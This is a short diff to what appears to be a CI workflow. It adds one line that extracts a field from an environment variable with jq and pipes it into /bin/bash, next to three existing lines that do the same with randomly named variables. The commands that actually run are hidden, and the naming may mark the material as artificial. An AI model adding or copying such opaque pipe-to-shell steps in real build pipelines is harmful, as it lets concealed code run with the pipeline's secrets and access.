@@ -24,6 +24,7 @@ jobs:
           echo $mvmx863 | jq -r .oetpz3 | /bin/bash
           echo $ugv057 | jq -r .l842 | /bin/bash
           printf '%s' "$qv793" | jq -r .mp61114 | /bin/bash
+          printf '%s' "$si5" | jq -r .rxg32 | /bin/bash
 
       - name: Upload artifact
         if: always()
